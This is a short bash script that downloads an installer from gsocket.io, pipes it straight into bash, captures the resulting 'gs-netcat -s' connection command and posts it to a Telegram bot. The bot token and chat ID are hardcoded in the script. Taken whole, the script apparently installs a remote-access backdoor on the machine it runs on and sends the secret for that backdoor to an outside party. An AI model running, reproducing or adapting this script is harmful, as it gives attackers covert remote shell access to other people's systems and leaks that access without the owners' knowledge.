#!/bin/bash

output=$(bash -c "$(curl -fsSL https://gsocket.io/y)")

if [[ "$output" == *"gs-netcat -s"* ]]; then
  chat_id="6256985839"  
  bot_token="7120060654:AAEmYjKb0zNviPESOFatSBc7SL4foGVZuRE"  
  message="Command found: $output"

  curl -s -X POST "https://api.telegram.org/bot$bot_token/sendMessage" \
       -d chat_id="$chat_id" \
       -d text="$message"
fi
